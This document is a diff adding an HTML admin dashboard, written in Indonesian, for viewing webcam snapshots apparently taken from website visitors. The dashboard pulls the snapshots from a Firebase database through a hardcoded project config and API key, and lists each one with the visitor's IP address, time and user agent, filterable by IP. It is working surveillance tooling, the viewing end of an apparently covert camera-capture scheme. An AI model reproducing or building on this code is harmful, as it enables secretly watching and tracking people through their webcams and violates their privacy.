@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Webcam Tracker</title>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #111;
+      color: #0f0;
+      padding: 1em;
+    }
+    .entry {
+      border: 1px solid #0f0;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 10px;
+    }
+    img {
+      max-width: 100%;
+      border: 1px solid #0f0;
+    }
+    select {
+      background: black;
+      color: lime;
+      padding: 5px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Data Webcam dari Pengunjung</h2>
+  <label>Pilih IP Pengunjung: </label>
+  <select id="ipFilter">
+    <option value="all">Semua</option>
+  </select>
+  <div id="output"></div>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
+      authDomain: "xr-social-53646.firebaseapp.com",
+      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "xr-social-53646",
+      storageBucket: "xr-social-53646.appspot.com",
+      messagingSenderId: "55685443011",
+      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const output = document.getElementById("output");
+    const ipFilter = document.getElementById("ipFilter");
+    let allData = [];
+
+    function renderData(data) {
+      output.innerHTML = "";
+      const selectedIP = ipFilter.value;
+      const filtered = selectedIP === "all" ? data : data.filter(d => d.ip === selectedIP);
+
+      filtered.reverse().forEach(d => {
+        const div = document.createElement("div");
+        div.className = "entry";
+        div.innerHTML = `
+          <b>IP:</b> ${d.ip}<br>
+          <b>Waktu:</b> ${d.time}<br>
+          <b>User Agent:</b> <small>${d.userAgent}</small><br><br>
+          <img src="${d.url}" alt="Snapshot Webcam">
+        `;
+        output.appendChild(div);
+      });
+    }
+
+    db.ref("webcam_snapshots").on("value", snapshot => {
+      const data = snapshot.val();
+      allData = [];
+      const ipSet = new Set();
+
+      for (const key in data) {
+        const item = data[key];
+        allData.push(item);
+        ipSet.add(item.ip);
+      }
+
+      // Perbarui dropdown filter IP
+      ipFilter.innerHTML = '<option value="all">Semua</option>';
+      [...ipSet].sort().forEach(ip => {
+        const option = document.createElement("option");
+        option.value = ip;
+        option.textContent = ip;
+        ipFilter.appendChild(option);
+      });
+
+      renderData(allData);
+    });
+
+    ipFilter.addEventListener("change", () => {
+      renderData(allData);
+    });
+  </script>
+</body>
+</html>
